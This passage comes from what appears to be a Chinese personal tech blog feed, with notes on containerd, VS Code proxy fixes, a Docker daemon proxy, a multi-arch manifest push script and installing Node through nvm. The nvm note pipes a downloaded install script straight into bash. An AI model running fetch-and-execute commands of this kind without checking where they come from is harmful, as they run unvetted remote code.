cri-containerd-cni-1.7.18-linux-amd64</span><br>cri-containerd.DEPRECATED.txt<br>etc/<br>etc/systemd/<br>etc/systemd/system/<br>etc/systemd/system/containerd.service<br>etc/cni/<br>etc/cni/net.d/<br>etc/cni/net.d/10-containerd-net.conflist<br>etc/crictl.yaml<br>usr/<br>usr/local/<br>usr/local/sbin/<br>usr/local/sbin/runc<br>usr/local/bin/<br>usr/local/bin/containerd-shim<br>usr/local/bin/crictl<br>usr/local/bin/containerd-stress<br>usr/local/bin/critest<br>usr/local/bin/ctr<br>usr/local/bin/ctd-decoder<br>usr/local/bin/containerd-shim-runc-v2<br>usr/local/bin/containerd-shim-runc-v1<br>usr/local/bin/containerd<br>opt/<br>opt/cni/<br>opt/cni/bin/<br>opt/cni/bin/tuning<br>opt/cni/bin/firewall<br>opt/cni/bin/loopback<br>opt/cni/bin/macvlan<br>opt/cni/bin/ptp<br>opt/cni/bin/bridge<br>opt/cni/bin/static<br>opt/cni/bin/dhcp<br>opt/cni/bin/dummy<br>opt/cni/bin/sbr<br>opt/cni/bin/vrf<br>opt/cni/bin/host-local<br>opt/cni/bin/bandwidth<br>opt/cni/bin/vlan<br>opt/cni/bin/host-device<br>opt/cni/bin/portmap<br>opt/cni/bin/ipvlan<br>opt/containerd/<br>opt/containerd/cluster/<br>opt/containerd/cluster/version<br>opt/containerd/cluster/gce/<br>opt/containerd/cluster/gce/configure.sh<br>opt/containerd/cluster/gce/env<br>opt/containerd/cluster/gce/cloud-init/<br>opt/containerd/cluster/gce/cloud-init/master.yaml<br>opt/containerd/cluster/gce/cloud-init/node.yaml<br>opt/containerd/cluster/gce/cni.template<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd】(202407) 04.安装nerdctl</title>
    <link href="/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2004.%E5%AE%89%E8%A3%85nerdctl/"/>
    <url>/2024/07/09/containerd/%E3%80%90containerd%E3%80%91(202407)%2004.%E5%AE%89%E8%A3%85nerdctl/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>favorites</title>
    <link href="/2024/07/08/books/favorites/"/>
    <url>/2024/07/08/books/favorites/</url>
    
    <content type="html"><![CDATA[<p>20240708<br>主题：离别<br>小时候我们词不达意，长大后我们言不由衷。真正的离别，不是桃花潭水，不是长亭古道，只不过在同样洒满阳光的早上，有的人永远留在了昨天。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【cygwin】windows下安装cygwin</title>
    <link href="/2024/06/25/software/%E3%80%90cygwin%E3%80%91windows%E4%B8%8B%E5%AE%89%E8%A3%85cygwin/"/>
    <url>/2024/06/25/software/%E3%80%90cygwin%E3%80%91windows%E4%B8%8B%E5%AE%89%E8%A3%85cygwin/</url>
    
    <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://velep.com/archives/747.html">cygwin介绍、安装及其使用 » reille blog (velep.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【vscode】(202406) vscode无法下载插件</title>
    <link href="/2024/06/25/software/%E3%80%90vscode%E3%80%91(202406)%20vscode%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%8F%92%E4%BB%B6/"/>
    <url>/2024/06/25/software/%E3%80%90vscode%E3%80%91(202406)%20vscode%E6%97%A0%E6%B3%95%E4%B8%8B%E8%BD%BD%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="问题介绍"><a href="#问题介绍" class="headerlink" title="问题介绍"></a>问题介绍</h2><p>error while fetching extensions.xhr failed</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231417.png" alt="image.png"></p><h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>open the network tab (F1 &gt; Toggle Developer Tools) and check the network error.</p><p>发现是代理问题</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624230755.png" alt="image.png"></p><p>打开远程linux系统下的一个目录，查看Proxy，没有东西</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231124.png" alt="image.png"></p><p>User下面也没有东西<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231142.png" alt="image.png"></p><p>打开一个windows空窗口，查找Proxy，确实有一个代理</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624230924.png" alt="image.png"></p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>删除此代理，返回打开远程linux代码的窗口，在扩展里面搜索插件，例如：Go，就可以加载出来了<br>我都没有重启vscode，就正常了~</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/microsoft/vscode/issues/202993">error while fetching extensions XHR failed · Issue #202993 · microsoft&#x2F;vscode (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【vscode】(202406) windows下vscode远程连接linux虚拟机时git无法加载的问题</title>
    <link href="/2024/06/23/software/%E3%80%90vscode%E3%80%91(202406)%20windows%E4%B8%8Bvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%B6git%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2024/06/23/software/%E3%80%90vscode%E3%80%91(202406)%20windows%E4%B8%8Bvscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5linux%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%97%B6git%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="问题1"><a href="#问题1" class="headerlink" title="问题1"></a>问题1</h1><h2 id="问题介绍"><a href="#问题介绍" class="headerlink" title="问题介绍"></a>问题介绍</h2><p>windwos下的vscode自动升级到1.89.1，linux虚拟机中的部分文件夹就无法加载git，部分文件夹可以加载，哪些文件夹可以加载、哪些文件夹不能加载是随机的</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><p>linux虚拟机的根目录下有个文件夹，叫<code>.vscode-server</code>，删除该文件夹，重启vscode，该文件夹自动生成，然后就好了</p><h1 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h1><h2 id="问题介绍-1"><a href="#问题介绍-1" class="headerlink" title="问题介绍"></a>问题介绍</h2><p>error while fetching extensions.xhr failed</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231417.png" alt="image.png"></p><h2 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h2><p>open the network tab (F1 &gt; Toggle Developer Tools) and check the network error.</p><p>发现是代理问题</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624230755.png" alt="image.png"></p><p>打开远程linux系统下的一个目录，查看Proxy，没有东西</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231124.png" alt="image.png"></p><p>User下面也没有东西<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231142.png" alt="image.png"></p><p>打开一个windows空窗口，查找Proxy，确实有一个代理</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624230924.png" alt="image.png"></p><h2 id="解决办法-1"><a href="#解决办法-1" class="headerlink" title="解决办法"></a>解决办法</h2><p>删除此代理，返回打开远程linux代码的窗口，在扩展里面搜索插件，例如：Go，就可以加载出来了<br>我都没有重启vscode，就正常了~</p><h1 id="问题3：20250517"><a href="#问题3：20250517" class="headerlink" title="问题3：20250517"></a>问题3：20250517</h1><h2 id="问题介绍-2"><a href="#问题介绍-2" class="headerlink" title="问题介绍"></a>问题介绍</h2><p>某一天，vscode自动更新以后，远程连接就有问题了，说是什么版本必须得超过多少，一气之下，就把vscode卸载，下载了一个低版本的vscode，结果，远程的116服务器就连不上了，报错如下：</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20250517115454.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20250517115615.png" alt="image.png"></p><h2 id="解决办法-2"><a href="#解决办法-2" class="headerlink" title="解决办法"></a>解决办法</h2><p>删除vscode，将版本换回我之前的版本，就ok啦，可以连上116了，也可以连上n2了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20250517121605.png" alt="image.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/microsoft/vscode/issues/202993">error while fetching extensions XHR failed · Issue #202993 · microsoft&#x2F;vscode (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【linux系列】(202406) (问题解决) hyper-v中ubuntu18.04虚拟机扩容后黑屏</title>
    <link href="/2024/06/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202406)%20(%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3)%20hyper-v%E4%B8%ADubuntu18.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%E5%90%8E%E9%BB%91%E5%B1%8F/"/>
    <url>/2024/06/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202406)%20(%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3)%20hyper-v%E4%B8%ADubuntu18.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%E5%90%8E%E9%BB%91%E5%B1%8F/</url>
    
    <content type="html"><![CDATA[<p>注意点：<br>1.删除所有检查点<br>2.扩容前先备份，万一出点啥问题呢？<br>3.我从50G扩到60G，扩完之后，开机一直黑屏，只有一个鼠标，进不去桌面；后面进到了命令行模式（按下<code>Ctrl+Alt+F1</code>（或尝试F2-F6）进入命令行模式），发现根分区已经打满了，所以桌面加载不出来；然后删除了部分文件，重新启动就进去了；<br>4.使用了gparted工具，比较方便，我只有一个50G根分区&#x2F;dev&#x2F;sda1和新扩容的10G，点击&#x2F;dev&#x2F;sda1，右键，选择<code>resize/move</code>，拖到最右侧，覆盖到那10G，点击<code>resize</code>，点击<code>apply</code>，再次查看lsblk，已经扩容成功了。</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【docker】(202406) docker通过代理拉取镜像</title>
    <link href="/2024/06/17/k8s/%E3%80%90docker%E3%80%91(202406)%20docker%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F/"/>
    <url>/2024/06/17/k8s/%E3%80%90docker%E3%80%91(202406)%20docker%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>docker是通过systemd的service文件启动的</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>已经配置了如下代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># cat ~/.bashrc |grep proxy</span><br><span class="hljs-built_in">export</span> http_proxy=http://192.168.20.20:7890<br><span class="hljs-built_in">export</span> https_proxy=http://192.168.20.20:7890<br></code></pre></td></tr></table></figure><p>但是，执行docker pull的时候无法拉取镜像，报错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># docker pull xxx//abc:v0.3.0</span><br>Error response from daemon: Get <span class="hljs-string">&quot;https://xxx/v2/&quot;</span>: net/http: request canceled <span class="hljs-keyword">while</span> waiting <span class="hljs-keyword">for</span> connection (Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers)<br></code></pre></td></tr></table></figure><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><p>修改docker的service文件，添加环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># cat /lib/systemd/system/docker.service |grep PROXY</span><br>Environment=<span class="hljs-string">&quot;HTTP_PROXY=http://192.168.20.20:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;HTTPS_PROXY=http://192.168.20.20:7890&quot;</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># systemctl show --property=Environment docker</span><br>Environment=HTTP_PROXY=http://192.168.20.20:7890 HTTPS_PROXY=http://192.168.20.20:7890<br><br><br>[root@ningan ~]<span class="hljs-comment"># systemctl daemon-reload </span><br>[root@ningan ~]<span class="hljs-comment"># systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>然后就可以成功拉取拉~</p><h1 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h1><p>docker 镜像由 docker daemon 管理，所以不能用修改 shell 环境变量的方法使用代理服务，而是从 systemd 角度设置环境变量。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.lfhacks.com/tech/pull-docker-images-behind-proxy/">如何配置docker通过代理服务器拉取镜像 | 自由行 (lfhacks.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【docker】(202406) docker上传manifest镜像</title>
    <link href="/2024/06/14/k8s/%E3%80%90docker%E3%80%91(202406)%20docker%E4%B8%8A%E4%BC%A0manifest%E9%95%9C%E5%83%8F/"/>
    <url>/2024/06/14/k8s/%E3%80%90docker%E3%80%91(202406)%20docker%E4%B8%8A%E4%BC%A0manifest%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">脚本功能</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从x86镜像仓库拉取x86镜像</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">从arm镜像仓库拉取arm镜像</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">修改tag之后，以manifest的方式传到支持manifest功能的新镜像仓库</span><br><br>docker login xxx -u xxx -p &#x27;xxx&#x27; <br><br>oldAmdHarbor=&quot;xxx&quot;<br>oldArmHarbor=&quot;xxx&quot;<br>newHarbor=&quot;xxx&quot;<br>images=(<br><span class="hljs-meta prompt_"># </span><span class="language-bash">dashboard:v2.5.0</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">metrics-scraper:v1.0.9</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">coredns:1.8.4</span><br>metrics-server:v0.5.2<br><span class="hljs-meta prompt_"># </span><span class="language-bash">pause:3.5</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx:1.14.2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">busybox:1.28</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">alpine-k8s:3.15.4-v2</span><br>)<br>for image in $&#123;images[@]&#125;<br>do<br>    oldAmdHarborImage=$oldAmdHarbor/$image<br>    oldArmHarborImage=$oldArmHarbor/$image<br>    newHarborImage=$newHarbor/$image<br>    newAmdHarborImage=$newHarbor/$image-amd64<br>    newArmHarborImage=$newHarbor/$image-arm64<br>    echo -e &quot;\n########## oldAmdHarborImage ##########&quot;<br>    echo $oldAmdHarborImage  <br><br>    echo -e &quot;\n########## oldArmHarborImage ##########&quot;<br>    echo $oldArmHarborImage   <br>    <br>    echo -e &quot;\n########## newHarborImage ##########&quot;<br>    echo $newHarborImage<br>    echo -e &quot;\n########## newAmdHarborImage ##########&quot;<br>    echo $newAmdHarborImage   <br>    echo -e &quot;\n########## newArmHarborImage ##########&quot;<br>    echo $newArmHarborImage       <br><br>    echo -e &quot;\n####################### 操作前 #######################&quot;<br>    app=`echo $image | cut -d &quot;:&quot; -f 1`<br>    echo -e &quot;\n########## docker images |grep $app |grep $newHarbor ##########&quot;<br>    docker images |grep $app |grep $newHarbor<br><br><br>    echo -e &quot;\n####################### 具体操作 #######################&quot;<br>    echo -e &quot;\n########## docker pull  $oldAmdHarborImage --platform amd64 ##########&quot;<br>    docker pull  $oldAmdHarborImage --platform amd64<br>    echo -e &quot;\n########## docker tag $oldAmdHarborImage $newAmdHarborImage ##########&quot;<br>    docker tag $oldAmdHarborImage $newAmdHarborImage<br>    echo -e &quot;\n########## docker push $newAmdHarborImage ##########&quot;<br>    docker push $newAmdHarborImage <br>    echo -e &quot;\n########## docker pull $oldArmHarborImage --platform arm64 ##########&quot;<br>    docker pull $oldArmHarborImage --platform arm64<br>    echo -e &quot;\n########## docker tag $oldArmHarborImage $newArmHarborImage ##########&quot;<br>    docker tag $oldArmHarborImage $newArmHarborImage<br>    echo -e &quot;\n########## docker push $newArmHarborImage ##########&quot;<br>    docker push $newArmHarborImage<br>    echo -e &quot;\n########## docker manifest create $newHarborImage $newAmdHarborImage $newArmHarborImage ##########&quot;<br>    docker manifest create $newHarborImage $newAmdHarborImage $newArmHarborImage <br>    echo -e &quot;\n########## docker manifest push $newHarborImage ##########&quot;<br>    docker manifest push $newHarborImage<br>    echo -e &quot;\n########## docker manifest inspect $newHarborImage ##########&quot;<br>    docker manifest inspect $newHarborImage<br><br><br>    echo -e &quot;\n####################### 操作后 #######################&quot;<br>    app=`echo $image | cut -d &quot;:&quot; -f 1`<br>    echo -e &quot;\n########## docker images |grep $app |grep $newHarbor ##########&quot;<br>    docker images |grep $app |grep $newHarbor<br>done<br><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【edge浏览器】(202406) 浏览器代理服务器PAC语法</title>
    <link href="/2024/06/11/software/%E3%80%90edge%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%91(202406)%20%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8PAC%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/06/11/software/%E3%80%90edge%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%91(202406)%20%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8PAC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://findproxyforurl.com/pac-functions/">PAC Functions | FindProxyForURL</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【edge浏览器】(202406) 修改默认的搜索引擎</title>
    <link href="/2024/06/04/software/%E3%80%90edge%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%91(202406)%20%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%9A%84%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
    <url>/2024/06/04/software/%E3%80%90edge%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%91(202406)%20%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%9A%84%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240605094006.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240605094138.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】(202405) scheduling framework</title>
    <link href="/2024/05/10/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202405)%20scheduling%20framework/"/>
    <url>/2024/05/10/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202405)%20scheduling%20framework/</url>
    
    <content type="html"><![CDATA[<p>每次调度一个Pod的尝试都分为两个阶段，即scheduling cycle（调度周期）和binding cycle（绑定周期）。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【node】(202405) linux下通过nvm安装node</title>
    <link href="/2024/05/10/software/%E3%80%90node%E3%80%91(202405)%20linux%E4%B8%8B%E9%80%9A%E8%BF%87nvm%E5%AE%89%E8%A3%85node/"/>
    <url>/2024/05/10/software/%E3%80%90node%E3%80%91(202405)%20linux%E4%B8%8B%E9%80%9A%E8%BF%87nvm%E5%AE%89%E8%A3%85node/</url>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 6.5.0-34-generic <span class="hljs-comment">#34~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 19 13:57:24 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure><h1 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npx create-react-app my-app</span><br>You are running Node 12.22.9.<br>Create React App requires Node 14 or higher. <br>Please update your version of Node.<br></code></pre></td></tr></table></figure><h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash</span><br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100 13527  100 13527    0     0  21473      0 --:--:-- --:--:-- --:--:-- 21505<br>=&gt; Downloading nvm from git to <span class="hljs-string">&#x27;/root/.nvm&#x27;</span><br>=&gt; Cloning into <span class="hljs-string">&#x27;/root/.nvm&#x27;</span>...<br>remote: Enumerating objects: 290, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (290/290), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (257/257), <span class="hljs-keyword">done</span>.<br>remote: Total 290 (delta 35), reused 105 (delta 20), pack-reused 0<br>Receiving objects: 100% (290/290), 163.31 KiB | 720.00 KiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (35/35), <span class="hljs-keyword">done</span>.<br>=&gt; Compressing and cleaning up git repository<br><br>=&gt; Appending nvm <span class="hljs-built_in">source</span> string to /root/.bashrc<br>=&gt; Appending bash_completion <span class="hljs-built_in">source</span> string to /root/.bashrc<br>=&gt; Close and reopen your terminal to start using nvm or run the following to use it now:<br><br><span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.nvm&quot;</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span>  <span class="hljs-comment"># This loads nvm</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/bash_completion&quot;</span> ] &amp;&amp; \. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/bash_completion&quot;</span>  <span class="hljs-comment"># This loads nvm bash_completion</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>注意：需要重新打开一个shell，查看是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># nvm -v</span><br><br>Node Version Manager (v0.35.3)<br><br>Note: &lt;version&gt; refers to any version-like string nvm understands. This includes:<br>  - full or partial version numbers, starting with an optional <span class="hljs-string">&quot;v&quot;</span> (0.10, v0.1.2, v1)<br>  - default (built-in) aliases: node, stable, unstable, iojs, system<br>  - custom aliases you define with `nvm <span class="hljs-built_in">alias</span> foo`<br><br> Any options that produce colorized output should respect the `--no-colors` option.<br><br>Usage:<br>  nvm --<span class="hljs-built_in">help</span>                                Show this message<br>  nvm --version                             Print out the installed version of nvm<br>  nvm install [-s] &lt;version&gt;                Download and install a &lt;version&gt;, [-s] from <span class="hljs-built_in">source</span>. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>    --reinstall-packages-from=&lt;version&gt;     When installing, reinstall packages installed <span class="hljs-keyword">in</span> &lt;node|iojs|node version number&gt;<br>    --lts                                   When installing, only select from LTS (long-term support) versions<br>    --lts=&lt;LTS name&gt;                        When installing, only select from versions <span class="hljs-keyword">for</span> a specific LTS line<br>    --skip-default-packages                 When installing, skip the default-packages file <span 